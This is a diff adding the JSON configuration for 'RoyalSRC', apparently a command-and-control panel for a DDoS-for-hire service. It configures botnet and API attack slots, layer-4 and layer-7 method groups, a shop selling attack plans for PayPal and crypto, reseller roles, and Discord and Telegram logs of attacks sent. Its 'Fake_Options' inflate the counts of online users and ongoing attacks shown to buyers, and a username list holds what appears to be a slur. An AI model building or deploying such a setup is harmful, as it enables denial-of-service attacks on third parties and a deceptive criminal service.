@@ -1,0 +1,902 @@
+{
+  "Masters_Settings": {
+    "License": {
+      "license_key": "You'r Royal SRC License Key Here",
+      "Ssh_Server_Config": {
+        "vps_ip_here": "You'r VIP IP HERE !",
+        "port_here": "1339",
+        "Ssh_Key_Path": "./assets/ssh-key",
+        "Basic_SSS_Login": {
+          "Enable": false,
+          "display_banner": {
+            "enabled": true,
+            "message": "Access is strictly reserved for authorized users.\r\nAny unauthorized access attempt will be detected and prosecuted.\r\n\r\nYour activities on this system are monitored and recorded.\r\nBy continuing, you agree to:\r\n- Being an authorized user\r\n- Respecting the terms of use\r\n- The monitoring of your activities\r\n\r\nCONNECTION INSTRUCTIONS:\r\n- Authentication uses SSH auth\r\n- When typing your password, characters will NOT be visible\r\n- This is normal security behavior - continue typing\r\n- Press ENTER when finished\r\n\r\nTo register (create an account if enabled):\r\n- Simply enter now a password \r\n- If the username is already taken, reconnect and change it.\r\n\r\nIf you do not accept these conditions,\r\ndisconnect immediately.\r\n\r\n"
+          },
+          "max_wrong_password_attempts": 3
+        }
+      },
+      "master_user": "root",
+      "maintenance_status": false
+    },
+    "Fake_Options": {
+      "enabled": true,
+      "Fake_Online_Users": {
+        "enabled": false,
+        "add_extra": 4
+      },
+      "Fake_Ongoing_Attacks": {
+        "enabled": false,
+        "add_extra": 3
+      },
+      "Bots": {
+        "min": 0,
+        "max": 0
+      }
+    }
+  },
+  "Security_Settings": {
+    "note_Blocked_SSH_Clients": "List of SSH clients blocked for accessing RoyalSRC.",
+    "Blocked_SSH_Clients": [
+      "ssh2js",
+      "ubuntu"
+    ],
+    "Whitelisted_SSH_Clients": {
+      "enabled": false,
+      "list": [
+        "SSH-2.0-PuTTY_Release_0.82"
+      ]
+    },
+    "note_IPs": "IPs allowed to Connect to cnc ( SSH ).",
+    "Whitelist_CNC_IP": {
+      "enabled": false,
+      "IPs": [
+        "8.8.8.8",
+        "1.1.1.1"
+      ]
+    },
+    "note_API_WL_IPs": "IPs allowed for accessing to API.",
+    "Whitelist_IP_FOR_API": {
+      "enabled": false,
+      "IPs": [
+        "8.8.8.8",
+        "1.1.1.1"
+      ]
+    },
+    "note_BL_IPs": "IPs blocked for accessing the RoyalSRC.",
+    "Blacklist_IP_CNC_API": {
+      "enabled": false,
+      "IPs": [
+        "1.1.1.1"
+      ]
+    }
+  },
+  "Spam_Protection_Settings": {
+    "user_spam_protection": {
+      "in_general": {
+        "settings": {
+          "enabled": true,
+          "amount": 7,
+          "per_seconds": 30
+        },
+        "Actions": {
+          "note": "use captcha or lock account or close session or warn & block attack",
+          "warn_and_block_attack": true,
+          "give_captcha": false,
+          "lock_account": {
+            "message": "You have been locked out of your account due to command spamming",
+            "duration_in_days": 1,
+            "enabled": false
+          },
+          "close_user_session": false
+        }
+      },
+      "Per_Target": {
+        "settings": {
+          "enabled": true,
+          "amount": 3,
+          "per_seconds": 60
+        },
+        "Actions": {
+          "note": "use captcha or lock account or close session or warn & block attack",
+          "warn_and_block_attack": true,
+          "give_captcha": false,
+          "lock_account": {
+            "message": "You have been locked out of your account due to spamming targets",
+            "duration_in_days": 1,
+            "enabled": false
+          },
+          "close_user_session": false
+        }
+      }
+    }
+  },
+  "Database_Settings": {
+    "note": "MongoDB connection string for the database.",
+    "mongo_url": "mongodb://root:your_password@localhost:27017/Royal"
+  },
+  "Attack_Settings": {
+    "Attack_Status": {
+      "attacks_enabled": true,
+      "attacks_disabled_message": "Attacks are currently disabled. Contact Your Owner If You have Questions",
+      "admins_bypass_disabled_attacks": true,
+      "return_royal_src_response_from_all_api_request_failed": true
+    },
+    "method_groups": [
+      {
+        "max_slots": 10,
+        "cooldown_seconds": 10,
+        "custom_role_name": "main_network"
+      },
+      {
+        "max_slots": 10,
+        "cooldown_seconds": 10,
+        "custom_role_name": "layer_4"
+      },
+      {
+        "max_slots": 10,
+        "cooldown_seconds": 10,
+        "custom_role_name": "layer_7"
+      },
+      {
+        "max_slots": 3,
+        "cooldown_seconds": 60,
+        "custom_role_name": "private_network"
+      }
+    ],
+    "Slot_Settings": {
+      "total_attack_slots_on_c2": 50,
+      "total_attack_slots_on_api": 30
+    },
+    "Users_Bypass_Total_Attack_Slots": {
+      "enabled": false,
+      "users": [
+        "root"
+      ]
+    },
+    "Global_Cooldown": {
+      "enabled": false,
+      "per_attack_delay_ms": 1000
+    },
+    "timeouts": {
+      "api_timeout_seconds": 10,
+      "server_timeout_seconds": 10,
+      "botnet_timeout_seconds": 10,
+      "max_idle_seconds": 999999
+    },
+    "Send_Time_Settings": {
+      "enabled": true,
+      "max_repeat_attack_count": 3,
+      "public_can_use_it": false,
+      "public_message": "You are not allowed to use this Feature.",
+      "Admins_can_use_it": true,
+      "Admins_message": "You are not allowed to use this Feature.",
+      "Resellers_can_use_it": false,
+      "Resellers_message": "You are not allowed to use this Feature.",
+      "Vips_can_use_it": true,
+      "Vips_message": "You are not allowed to use this Feature.",
+      "Private_can_use_it": true,
+      "Private_message": "You are not allowed to use this Feature."
+    }
+  },
+  "Cnc_Settings": {
+    "Note": "General RoyalSRC settings and configurations.",
+    "project_name": "Project Name HERE",
+    "title_update_sleep_ms": 10,
+    "default_title": "Royal SRC inititative, Custom Security System Engaged",
+    "user_expired_message": "You are expired, please renew your account.",
+    "tos_page_enabled": true,
+    "owner_can_bypass_tos": false,
+    "holder_cant_use_all_methods_only_holder_methods": false,
+    "only_1_ip_per_user": {
+      "CNC": false,
+      "forced_on_who": {
+        "note": "If you want to force all users to use only 1 IP per user, set all_users to true. If you want to force only specific users to use only 1 IP per user, set all_users to false and add the usernames of the users you want to force.",
+        "all_users": true,
+        "exclude_users": {
+          "note": "Enabling this will force everyone to use only 1 IP per user except the users below.",
+          "enabled": true,
+          "usernames": [
+            "root"
+          ]
+        }
+      }
+    },
+    "Username_Blacklists": [
+      "niger"
+    ],
+    "guest_user": {
+      "note": "Enabling this will prevent the username below from changing their password.",
+      "enabled": true,
+      "username": [
+        "niger",
+        "free"
+      ]
+    },
+    "Chat_Settings": {
+      "enabled": true,
+      "title": "=== ROYAL SRC GLOBAL CHAT ===",
+      "max_messages": 10000,
+      "max_users": 100,
+      "max_messages_per_user_per_minute": 10,
+      "Restrictions": {
+        "only_admins_can_access_chat": false,
+        "only_resellers_can_access_chat": false,
+        "only_vips_can_access_chat": false,
+        "only_holders_can_access_chat": false,
+        "only_users_can_access_chat": false
+      }
+    },
+    "Shop_Settings": {
+      "note": "View Here for Support ( https://discord.com/channels/1358053746420219995/1358060457138852020/1370211481777344512 )",
+      "note2": "Owner User cant See Shop Page After Login !",
+      "enabled": false,
+      "custom_size_terminal": "30;100",
+      "currency": "USD",
+      "connection_shop": true,
+      "command_shop": true,
+      "note_to_payee": "Purchase Product Succefully. Thanks for your trust !",
+      "success_uRL": "https://discord.royalprojets.com",
+      "cancel_uRL": "https://royalprojets.com/",
+      "paypal_client_id": "PayPal Client ID ( https://developer.paypal.com )",
+      "paypal_secret_key": "PayPal Secret Key ( https://developer.paypal.com/home/ )",
+      "api_crypto_key": "XXXXXXXXXX ( https://nowpayments.io/ )",
+      "crypto_available": [
+        "btc",
+        "ltc",
+        "eth",
+        "xrp"
+      ]
+    },
+    "User_Banned_After_Send_Attack_From_Bl_Target": {
+      "enabled": false,
+      "message": "Auto-ban for attacking a blacklisted target.",
+      "api_count": 10,
+      "c2_count": 5,
+      "discord_bot_count": 3,
+      "telegram_bot_count": 3
+    },
+    "note": "Register System LOGIN/REGISER",
+    "Register_Mode": false,
+    "Default_User_Settings": {
+      "note": "if you have enable Basic_SSS_Login You do not use the basic question, you should just enter a username not existing in the database + a password and the account will be created auto",
+      "default_questions": "Would you like to (login) or (register) ?",
+      "max_time": 60,
+      "max_sessions": 1,
+      "days_active": 5,
+      "cooldown": 45,
+      "concurrents": 1,
+      "vip_acces": false,
+      "admin_acces": false,
+      "holder_acces": false,
+      "reseller_acces": false,
+      "api_acces": false,
+      "private_acces": false,
+      "powersaving": false,
+      "max_daily_attacks": 100,
+      "bypass_powersaving": false,
+      "bypass_blacklist": false,
+      "custom_roles": {
+        "enabled": false,
+        "roles": [
+          {
+            "role_name": "main_network"
+          }
+        ]
+      }
+    },
+    "Logs_Save_To_File": {
+      "log_login_ips_to_file": false,
+      "log_attacks_to_file": false,
+      "log_failed_api_requests_to_file": false,
+      "not_send_logs_for_owner_user": false
+    },
+    "Discord_Integration": {
+      "note_Discord_Logs": "Settings for Discord Logs.",
+      "Shop_Logs": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "PLAN PURCHASED SUCCESSFULLY",
+        "image": "https://pluspng.com/img-png/clock-png-clock-png-image-25766-2400.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Attack_Sent": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "USER ATTACK SENT SUCCESSFULLY",
+        "image": "https://pluspng.com/img-png/cute-ninja-png-ninja-clipart-kid-4-800.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Connection_Logs": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "USER connected Succefully",
+        "image": "https://pluspng.com/img-png/attention-sign-png-attention-sign-traffic-road-sign-warning-caution-788.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Blacklisted_Host": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "USER TRIED ATTACKING BLACKLIST",
+        "image": "https://pluspng.com/img-png/street-signs-png-hd-sign-stop-png-5000.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Admin_Actions": {
+        "webhook_url": "https://discord.com/webhook",
+        "title": "ADMIN ACTION ALERT",
+        "image": "https://pluspng.com/img-png/street-signs-png-hd-traffic-signs-road-sign-hd-png-300.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Reseller_Actions": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "RESELLER ACTION ALERT",
+        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/OOjs_UI_icon_alert_destructive.svg/480px-OOjs_UI_icon_alert_destructive.svg.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Account_Creation_Register": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "API Logs",
+        "image": "https://pluspng.com/img-png/2-free-png-pluspng.com.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Failed_Captcha": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "USER FAILED CAPTCHA",
+        "image": "https://pluspng.com/img-png/attention-sign-png-attention-sign-traffic-road-sign-warning-caution-788.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "Failed_MFA": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "USER FAILED MFA",
+        "image": "https://pluspng.com/img-png/attention-sign-png-attention-sign-traffic-road-sign-warning-caution-788.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      },
+      "API_Logs": {
+        "webhook_url": "Discord Webhook Url Here ( https://discord.com/api/webhooks/ )",
+        "title": "API Logs",
+        "image": "https://pluspng.com/img-png/star-png-red-star-png-image-png-image-200.png",
+        "hex_color": "#FF5733",
+        "enabled": true
+      }
+    },
+    "Telegram_Integration": {
+      "note_Telegram_Logs": "Settings for Telegram Logs.",
+      "Shop_Logs": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "PLAN PURCHASED SUCCESSFULLY",
+        "enabled": true
+      },
+      "Attack_Sent": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "USER ATTACK SENT SUCCESSFULLY",
+        "enabled": true
+      },
+      "Blacklisted_Host": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "USER TRIED ATTACKING BLACKLIST",
+        "enabled": true
+      },
+      "Connection_Logs": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "Connection Logs",
+        "enabled": true
+      },
+      "Failed_MFA": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "USER Failed MFA",
+        "enabled": true
+      },
+      "Failed_Captcha": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "USER FAILED CAPTCHA",
+        "enabled": true
+      },
+      "Reseller_Actions": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "Reseller ACTION ALERT",
+        "enabled": true
+      },
+      "Account_Creation_Register": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "User Register Succefully",
+        "enabled": true
+      },
+      "Admin_Actions": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "ADMIN ACTION ALERT",
+        "enabled": true
+      },
+      "API_Logs": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "Api Logs ALERT",
+        "enabled": true
+      },
+      "Report_Logs": {
+        "token": "https://t.me/botfather for Create Bot Telegram",
+        "chat_id": "-chatid",
+        "title": "Report ACTION ALERT",
+        "enabled": true
+      }
+    }
+  },
+  "Error_Messages": {
+    "note": "Custom Any error message on Royal SRC AIO ( DLC ).",
+    "enable": true,
+    "404_Not_Found": {
+      "Note": "Custom Message Error 404",
+      "text": "404 page not found! Royal SRC DLC Funnel Created By https://royalprojets.com !"
+    },
+    "Invalid_Credentials": {
+      "Note": "Custom Message Error Invalid credentials",
+      "text": "Invalid credentials, Contact your owner if you have questions."
+    },
+    "Access_Denied": {
+      "Note": "Custom Message Access Denied",
+      "text": "Access denied: Admins only, Contact your owner if you think it's a problem"
+    }
+  },
+  "Permissions_Settings": {
+    "note_Disabled_Commands": "Subs/Commands that are disabled for all NO ADMIN users.",
+    "Disabled_Commands": [
+      "commands1"
+    ],
+    "Disabled_Subcommands": [
+      "subcommands1"
+    ],
+    "Spinner_Custom": {
+      "Spinners": [
+        {
+          "name": "custom",
+          "Settings": {
+            "milliseconds": 1000,
+            "spinner": [
+              "🖤",
+              "Royal",
+              "SRC",
+              "BEST",
+              "CNC",
+              "🖤"
+            ]
+          }
+        },
+        {
+          "name": "simple",
+          "Settings": {
+            "milliseconds": 100,
+            "spinner": [
+              "\\",
+              "|",
+              "/",
+              "-"
+            ]
+          }
+        },
+        {
+          "name": "loading",
+          "Settings": {
+            "milliseconds": 500,
+            "spinner": [
+              "◜",
+              "◝",
+              "◞",
+              "◟"
+            ]
+          }
+        },
+        {
+          "name": "moov",
+          "Settings": {
+            "milliseconds": 100,
+            "spinner": [
+              "⠋",
+              "⠙",
+              "⠹",
+              "⠸",
+              "⠼",
+              "⠴",
+              "⠦",
+              "⠧",
+              "⠇",
+              "⠏"
+            ]
+          }
+        },
+        {
+          "name": "arrow",
+          "Settings": {
+            "milliseconds": 100,
+            "spinner": [
+              "←",
+              "↖",
+              "↑",
+              "↗",
+              "→",
+              "↘",
+              "↓",
+              "↙"
+            ]
+          }
+        }
+      ]
+    },
+    "Online_Command": {
+      "user_ip_address": {
+        "hide": true,
+        "hidden_text": "xx:xx:xx:xx"
+      },
+      "user_username": {
+        "hide": true,
+        "hidden_text": "User"
+      },
+      "unknown_ssh_client": "Unknown"
+    },
+    "Reseller_Permissions": {
+      "can_create_clients": true,
+      "can_create_clients_by_presets": true,
+      "max_clients_per_day": 5,
+      "can_delete_clients": false,
+      "can_ban_clients": false,
+      "can_view_clients": true,
+      "Can_Edit_Clients": {
+        "max_daily_attacks": false,
+        "holder": false,
+        "vip": false,
+        "concurrents": false,
+        "expiry": false,
+        "cooldown": false,
+        "maxtime": false
+      }
+    }
+  },
+  "Themes_Settings": [
+    {
+      "note": "CUSTOM THEMES HERE",
+      "name": "Themes",
+      "description": "Theme by Royaloakap",
+      "example": "assets/branding/Themes/commands/clear.royal",
+      "colour": "[97m"
+    }
+  ],
+  "Custom_Commands_Banners": [
+    {
+      "name": "settings",
+      "description": "View the settings page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "settings",
+      "command_aliases": [
+        "setting"
+      ]
+    },
+    {
+      "name": "commands",
+      "description": "View the commands page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "commands",
+      "command_aliases": [
+        "commands",
+        "command"
+      ]
+    },
+    {
+      "name": "stats",
+      "description": "View the stats page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "stats",
+      "command_aliases": [
+        "statistic",
+        "statistics"
+      ]
+    },
+    {
+      "name": "clear",
+      "description": "Clear page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "clear",
+      "command_aliases": [
+        "cls"
+      ]
+    },
+    {
+      "name": "plan",
+      "description": "View My Plan",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "plan",
+      "command_aliases": [
+        "myplan"
+      ]
+    },
+    {
+      "name": "help",
+      "description": "View the help page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "help",
+      "command_aliases": [
+        "?",
+        "aide"
+      ]
+    },
+    {
+      "name": "usage",
+      "description": "View the usage page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "attack-syntax",
+      "command_aliases": [
+        "attacksyntax",
+        "syntax"
+      ]
+    },
+    {
+      "name": "methods",
+      "description": "View the methods page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "methods",
+      "command_aliases": [
+        "method",
+        "methodes"
+      ]
+    },
+    {
+      "name": "social",
+      "description": "View the Socials Link page.",
+      "require_role": {
+        "vip": false,
+        "reseller": false,
+        "admin": false,
+        "owner": false,
+        "private": false,
+        "holder": false,
+        "api": false
+      },
+      "path_to_banner": "socials-links",
+      "command_aliases": [
+        "socials",
+        "link",
+        "discord",
+        "telegram"
+      ]
+    }
+  ],
+  "DLC_Settings": {
+    "note_AIO_Funnel": "Settings for All-In-One Funnel integration.",
+    "AIO_Funnel": {
+      "enabled": false,
+      "api_port": 80
+    },
+    "Backup_Options_Telegram": {
+      "note": "Use /backup CMD on Telegram ! Only for DLC Members.",
+      "backup_path_ubuntu": "/ubuntu/RoyalSRC/assets/Backup",
+      "backup_path_root": "/root/RoyalSRC/assets/Backup",
+      "royal_src_path": "/root/RoyalSRC",
+      "notee": "This is for Telegram CMD Bot (/backup & /update)"
+    },
+    "API_Settings": {
+      "debug_mode_enabled": false,
+      "allow_multi_concurrent_api_attacks": false,
+      "api_users_can_send_attacks_from_cnc": false,
+      "Host_Information": {
+        "unknown_region": "N/A",
+        "unknown_country": "N/A",
+        "unknown_country_code": "N/A",
+        "unknown_city": "N/A",
+        "unknown_zip": "N/A",
+        "unknown_isp": "N/A",
+        "unknown_asn": "N/A",
+        "unknown_org": "N/A",
+        "unknown_timezone": "N/A",
+        "len": {
+          "default": 1,
+          "max": 1024,
+          "min": 1
+        },
+        "threads": {
+          "default": 5,
+          "max": 100,
+          "min": 1
+        },
+        "rps": {
+          "default": 64,
+          "max": 300,
+          "min": 1
+        },
+        "geo": {
+          "default": "ALL",
+          "list": [
+            "CN",
+            "JP",
+            "US",
+            "FR",
+            "EU"
+          ]
+        }
+      },
+      "note_per_api_request_delay": "If you enable this option and set a delay in milliseconds, all sends via Telegram/Discord bots as well as from the SSH server (C2) will be done with this delay between each configured API request.",
+      "Per_API_Request_Delay": {
+        "enabled": false,
+        "per_api_request_delay_ms": 25
+      },
+      "Custom_Attack_Sent_Page": {
+        "enabled": false,
+        "html_file": "assets/public/attack_sent.html"
+      },
+      "Additional_Security": {
+        "note": "Enabling this will only allow people to access your API with the TLS (HTTPS).",
+        "force_tls": false,
+        "domain_lock": {
+          "note": "Enabling this will only allow people to access your API with the domain below.",
+          "enabled": false,
+          "domain": "your-domain.com"
+        }
+      },
+      "Developer_Settings": {
+        "note": "Custom All Royal SRC DLC API Endpoints",
+        "subdirectory": {
+          "api": "api",
+          "admin": "admin",
+          "lookup": "lookup"
+        },
+        "Endpoints_Path": {
+          "api": {
+            "attack": "attack",
+            "view_ongoing": "view_ongoing",
+            "view_plan": "view_plan",
+            "network_statistics": "network_statistics"
+          },
+          "lookup": {
+            "mc_Lookup": "lookup_mc",
+            "cfx_Lookup": "lookup_fivem"
+          },
+          "admin": {
+            "view_user_plan": "view_user_plan",
+            "view_user_logs": "view_user_logs",
+            "view_all_logs": "all_logs",
+            "view_all_users": "all_users",
+            "add_user": "add_user",
+            "edit_user": "edit_user",
+            "delete_user": "delete_user",
+            "key_info": "key_info"
+          }
+        }
+      },
+      "Notify_Online": {
+        "note": "in Dev",
+        "enabled": false,
+        "Only_Admins": {
+          "enabled": false,
+          "Bonus": false
+        }
+      }
+    },
+    "Reverse_Proxy_Settings": {
+      "enabled": false,
+      "note": "In Dev",
+      "api_token": "xxxxxxxxxxxxxxxxxxxxxxxx",
+      "proxy_host": "1.1.1.1",
+      "api_port": 80
+    }
+  },
+  "Controls_Settings": {
+    "login_captcha": {
+      "forced": true,
+      "ascii": true,
+      "forced_on_who": {
+        "note": "Only enable one of the options below. ('all_users', 'exclude_users', 'single_users', 'exclude_admin', 'exclude_owner') ",
+        "all_users": true,
+        "exclude_users": {
+          "note": "Enabling this will force everyone to do a login captcha except the users below.",
+          "enabled": false,
+          "usernames": [
+            "root"
+          ]
+        },
+        "single_users": {
+          "note": "Enabling this will only force the users below to do a login captcha.",
+          "enabled": false,
+          "usernames": []
+        },
+        "exclude_admin": true,
+        "exclude_owner": true
+      }
+    },
+    "Multi_Factor_Authentication": {
+      "Status": false,
+      "forced_on_who": {
+        "note": "$",
+        "all_users": false,
+        "exclude_users": {
+          "note": "Enabling this will force everyone to use MFA except the users below.",
+          "enabled": false,
+          "usernames": [
+            "root"
+          ]
+        },
+        "single_users": {
+          "note": "Enabling this will only force the users below to use MFA.",
+          "enabled": true,
+          "usernames": [
+            "test"
+          ]
+        },
+        "exclude_owner": true,
+        "exclude_admin": false
+      }
+    }
+  }
+}
